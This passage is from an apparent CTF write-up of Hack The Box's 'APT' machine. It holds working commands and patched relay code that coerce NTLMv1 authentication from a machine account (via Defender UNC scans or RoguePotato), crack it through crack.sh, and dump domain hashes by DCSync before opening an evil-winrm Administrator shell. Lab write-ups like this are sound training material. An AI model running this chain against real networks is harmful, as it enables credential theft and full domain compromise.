+<p>The goal is to capture a Net-NTLMv1 challenge-response from the SYSTEM account (APT$). Net-NTLMv1 uses weak DES-based encryption, and <a href="https://crack.sh" target="_blank">crack.sh</a> maintains precomputed rainbow tables for the fixed challenge <code>1122334455667788</code>. By controlling the NTLM challenge in a capture server, we can set it to this known value and then submit the resulting response to crack.sh for instant decryption, recovering the NTLM hash of the machine account.</p>
+
+<div class="callout callout-info">
+  <div class="callout-title">How crack.sh Works</div>
+  <p>crack.sh built rainbow tables for the specific 8-byte NTLM challenge <code>1122334455667788</code>. Normally, a unique server-generated challenge prevents rainbow table attacks. But when we control the server (Responder or a custom RPC server), we can force this specific challenge, making the rainbow table lookup trivial. The service returns the NT hash within minutes for free.</p>
+</div>
+
+<h3 id="method1-defender">Method 1 &mdash; Defender + Responder (Unintended)</h3>
+<p>Windows Defender can be instructed to scan a specific file path, including UNC paths on remote SMB shares. When Defender scans a file on an attacker-controlled share, it authenticates as the SYSTEM account (APT$). By running Responder with the <code>--lm</code> flag to force LM downgrade and a modified challenge of <code>1122334455667788</code>, we capture the Net-NTLMv1 response.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># In /etc/responder/Responder.conf, set challenge to 1122334455667788
+$ sudo responder -I tun0 --lm</code></pre>
+</div>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell">PS> &"C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File \\10.10.14.9\share\file.txt</code></pre>
+</div>
+
+<p>Responder captures the Net-NTLMv1 hash of the APT$ machine account:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">[SMB] NTLMv1 Client   : 10.10.10.213
+[SMB] NTLMv1 Username : HTB\APT$
+[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788</code></pre>
+</div>
+
+<h3 id="method2-roguepotato">Method 2 &mdash; RoguePotato + Custom RPC Server (Intended)</h3>
+<p>The intended path uses RoguePotato to trigger an NTLM authentication from SYSTEM to a custom RPC server. This requires significant modifications to both RoguePotato (IPv6 support) and ntlmrelayx (custom RPC relay server with fixed challenge). The key changes include:</p>
+
+<ul>
+  <li><strong>RoguePotato IPv6 patch</strong> &mdash; The <code>remote_ip_mb</code> buffer is expanded from 16 to 40 bytes to accommodate IPv6 address strings, and the wide-character conversion is updated accordingly.</li>
+  <li><strong>Custom RPC relay server</strong> &mdash; Built on a patched version of Impacket's ntlmrelayx, adding an RPC server that intercepts NTLM negotiation, sets the challenge to <code>1122334455667788</code>, disables Extended Session Security (ESS), and prints the captured response.</li>
+  <li><strong>IPv6 support in Impacket</strong> &mdash; The <code>ProtocolClient.__init__</code> method is patched to properly handle IPv6 addresses in the <code>netloc</code> field, which was incorrectly splitting on colons.</li>
+</ul>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python"># Key modification in rpcrelayserver.py do_ntlm_negotiate:
+def do_ntlm_negotiate(self, token):
+    self.target = self.server.config.target.getTarget(None)
+    self.client = smbrelayclient.SMBRelayClient(self.server.config, self.target)
+    if not self.client.initConnection():
+        raise Exception("Failed to connect to SMB")
+    self.challengeMessage = self.client.sendNegotiate(token)
+    # Force the known challenge for crack.sh rainbow tables
+    self.challengeMessage['challenge'] = bytes.fromhex('1122334455667788')
+    data = bytearray(self.challengeMessage.getData())
+    data[22] = data[22] & 0xf7  # Disable ESS
+    self.challengeMessage = bytes(data)</code></pre>
+</div>
+
+<p>Running the custom RPC server and triggering RoguePotato produces the same Net-NTLMv1 hash as the Defender method, confirming both paths lead to the same result:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ python rpcsrv.py
+[+] APT$::HTB:95aca8c7248774cb427e1ae5b8d5ce6830a49b5bb858d384:95aca8c7248774cb427e1ae5b8d5ce6830a49b5bb858d384:1122334455667788 ntlm</code></pre>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="shell-admin">Shell as Administrator</h2>
+
+<h3 id="crack-sh">Cracking with crack.sh</h3>
+<p>Submitting the Net-NTLMv1 hash to crack.sh returns the NTLM hash of the APT$ machine account within minutes. The rainbow table lookup exploits the weak DES encryption in NTLMv1 to recover the original NT hash used to generate the challenge response.</p>
+
+<h3 id="dump-live-ad">Dumping Live AD Hashes</h3>
+<p>With the machine account NT hash, we can use <code>secretsdump.py</code> to perform a DCSync attack and dump all domain credentials from the live AD, including the Administrator hash:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ secretsdump.py -hashes :d167c3238864b12f5f82feae86a7f798 'htb.local/APT$@htb.local'
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
+henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
+henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::</code></pre>
+</div>
+
+<h3 id="admin-shell">Administrator Shell</h3>
+<p>The Administrator NTLM hash grants full access to the domain controller via WinRM:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ evil-winrm -u administrator -H c370bddf384a691d811ff3495e8a72e2 -i apt.htb
+Evil-WinRM shell v2.4
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\desktop\root.txt
+d93e6432************************</code></pre>
+</div>
+
+</main>
+</div>
+
+<footer class="site-footer">
+  &copy; 2025 QA210 &mdash; Yuri08 CTF Writeups
+</footer>
+
+<script>
+function copyCode(btn) {
+  const pre = btn.closest('.code-block-wrapper').querySelector('pre');
+  navigator.clipboard.writeText(pre.textContent).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+function toggleMobileToc() {
+  document.getElementById('tocOverlay').classList.toggle('show');
+  document.getElementById('tocMobilePanel').classList.toggle('show');
+}
+function buildTOC() {
+  const headings = document.querySelectorAll('.main-content h2, .main-content h3');
+  const desktopUL = document.getElementById('tocDesktop');
+  const mobileUL = document.getElementById('tocMobile');
+  desktopUL.innerHTML = '';
+  mobileUL.innerHTML = '';
+  headings.forEach(h => {
+    if (!h.id) h.id = h.textContent.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/(^-|-$)/g, '');
+    const li = document.createElement('li');
+    const a = document.createElement('a');
+    a.href = '#' + h.id;
+    a.textContent = h.textContent;
+    if (h.tagName === 'H3') a.classList.add('toc-h3');
+    li.appendChild(a);
+    desktopUL.appendChild(li);
+    mobileUL.appendChild(li.cloneNode(true));
+  });
+}
+buildTOC();
+const spyHeadings = document.querySelectorAll('.main-content h2, .main-content h3');
+const spyLinks = document.querySelectorAll('#tocDesktop a, #tocMobile a');
+function updateSpy() {
+  let current = '';
+  spyHeadings.forEach(h => { if (h.getBoundingClientRect().top <= 80) current = h.id; });
+  spyLinks.forEach(a => { a.classList.toggle('active', a.getAttribute('href') === '#' + current); });
+}
+window.addEventListener('scroll', updateSpy, { passive: true });
+updateSpy();
+
+// Three.js Background — TetrahedronGeometry (DC/AD "pyramid of trust" theme)
+(function() {
+  const canvas = document.getElementById('three-bg');
+  const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 100);
+  camera.position.z = 5;
+
+  const geo = new THREE.TetrahedronGeometry(2.5, 0);
+  const mat = new THREE.MeshBasicMaterial({ color: 0x58a6ff, wireframe: true, transparent: true, opacity: 0.3 });
+  const mesh = new THREE.Mesh(geo, mat);
+  scene.add(mesh);
+
+  const pCount = 500;
+  const pGeo = new THREE.BufferGeometry();
+  const pPos = new Float32Array(pCount * 3);
+  const pVel = [];
+  for (let i = 0; i < pCount; i++) {
+    pPos[i*3]   = (Math.random() - 0.5) * 14;
+    pPos[i*3+1] = (Math.random() - 0.5) * 14;
+    pPos[i*3+2] = (Math.random() - 0.5) * 8;
+    pVel.push(Math.random() * 0.01 + 0.003);
+  }
+  pGeo.setAttribute('position', new THREE.BufferAttribute(pPos, 3));
+  const pMat = new THREE.PointsMaterial({ color: 0x79c0ff, size: 0.04, transparent: true, opacity: 0.6 });
+  const particles = new THREE.Points(pGeo, pMat);
+  scene.add(particles);
+
+  let mX = 0, mY = 0;
+  document.addEventListener('mousemove', e => {
+    mX = (e.clientX / window.innerWidth - 0.5) * 2;
+    mY = (e.clientY / window.innerHeight - 0.5) * 2;
+  });
+
+  function animate() {
+    requestAnimationFrame(animate);
+    mesh.rotation.x += 0.004;
+    mesh.rotation.y += 0.006;
+    const pos = particles.geometry.attributes.position.array;
+    for (let i = 0; i < pCount; i++) {
+      pos[i*3+1] -= pVel[i];
+      if (pos[i*3+1] < -7) { pos[i*3+1] = 7; pos[i*3] = (Math.random() - 0.5) * 14; }
+    }
+    particles.geometry.attributes.position.needsUpdate = true;
+    camera.rotation.y += (mX * 0.04 - camera.rotation.y) * 0.01;
+    camera.rotation.x += (mY * 0.04 - camera.rotation.x) * 0.01;
+    renderer.render(scene, camera);
+  }
+  animate();
+
+  window.addEventListener('resize', () => {
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+  });
+})();
+</script>
+</body>
+</html>
